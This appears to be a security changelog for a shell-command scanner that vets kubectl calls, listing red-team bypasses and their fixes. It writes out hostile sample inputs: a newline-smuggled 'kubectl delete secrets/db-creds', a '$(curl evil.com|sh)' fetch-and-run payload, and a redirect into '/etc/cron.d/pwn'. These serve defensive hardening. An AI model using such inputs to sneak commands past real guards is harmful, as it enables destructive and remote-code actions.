- **[HIGH, Issue #70, red-team]** `CHAIN_OPERATORS` (`&&`, `||`, `;`, `|`) omitted a bare newline and a bare (non-doubled) `&` — both start a genuinely separate command in real bash with no special syntax at all. `kubectl get pods/api --context=prod\nkubectl delete secrets/db-creds --context=prod` clean-resolved as get-only; same for `& `-separated, and reachable through `at`'s heredoc body. Fixed: new `findLiveTrailingSensitiveSeparator` (`shell-scanner.ts`) flags a live newline or non-doubled `&` that has more live content after it — a bare TRAILING `&` (nohup's own background marker) and a bare trailing newline stay exempt, since neither hides a second command.
- **[HIGH, Issue #71, red-team]** A `<<<` herestring was mis-matched as a heredoc marker (`findLiveHeredocMarker`'s regex matched two of the three `<` characters), swallowing every following line as inert body before any chain check ran. Fixed: the marker regex now requires a lookbehind AND lookahead — exactly two consecutive `<` characters, never three or more.
- **[HIGH, Issues #72/#69, red-team + app-security]** The directory-flag guard (design-challenger's mandated fix) recognized only `--directory=<v>` and bare `-C`/`-d`; `--directory <v>`, `-d=<v>`, and `-C=<v>` all slipped through. Worse: `-C=<v>` also fell through to the generic short-flag path, where `resolveFlagAlias`'s lowercasing resolved it to the SAME canonical name `-c=` aliases to (`context`) — a directory flag could silently supply the cluster field. Fixed: `matchDirectoryFlagToken` now covers every ordinary spelling of the flag; because it is checked before the generic alias branch, the alias-collision closes as a direct consequence, not a second patch.
- **[HIGH, Issue #73, red-team]** Only the first resource-shaped positional token was extracted (`positional.find`, not `filter`) — `kubectl delete pods/api secrets/db-creds --context=prod` reported `pods/api` only while a real shell deletes both. Same shape reachable through `xargs`, whose entire purpose (appending arguments read from stdin at runtime) is invisible to any static parse. Fixed: `collectResources` collects EVERY resource-shaped token (any parse failure among them denies the whole call, never a partial accept); `xargs`'s `extractInner` now always returns `undefined` — every xargs invocation resolves to `unresolved`, honestly, rather than resolving only its visible (and always incomplete) prefix.
- **[HIGH, Issue #68, app-security — "the sharpest one"]** An unterminated single quote made the `quoteStates` walker treat everything from the open quote to end-of-string as permanently inert, disabling chain-operator detection AND design-challenger's command-substitution detection at once: `kubectl get pod/foo --context='prod $(curl evil.com|sh)` resolved clean. Fixed: `quoteStates`/`hasUnterminatedQuote` are now both thin wrappers over one shared `walkQuoteState` walk exposing the walk's FINAL state (not just the per-character array — a quote closed by the very last character of the string looks identical to an unterminated one in the per-character array alone, a follow-up bug this file's own regression test caught before it shipped). `collectSyntaxUnresolved` checks this FIRST, ahead of every other syntax check.
- **[MED, Issue #74, red-team]** Only the first live redirect target was extracted — `cat p > /tmp/ok > /etc/cron.d/pwn` reported `/tmp/ok` only while bash opens and truncates both, with stdout landing on the last. Fixed: `extractRedirectTargets` (renamed, plural) collects every live match.
- **[MED, Issues #75/#78, red-team + architecture — duplicate finding, one fix]** `shell-detector-mutants.ts`'s byte-literal multi-line anchors crashed uncaught on a CRLF-checked-out working tree (this repo had no `.gitattributes`; a Windows `core.autocrlf=true` checkout converts previously-tracked files to CRLF while brand-new untracked files stay LF). Confirmed dormant in real CI (ubuntu-latest, LF) but a real local dev-platform hazard. Fixed both ways, per both reports' "either sufficient alone": `textMutant` now normalizes CRLF→LF on both the source and the anchor/replacement before comparing; new `.gitattributes` (`* text=auto eol=lf` plus explicit source-extension rules) prevents the drift at its source for every future file, not just this one mechanism.
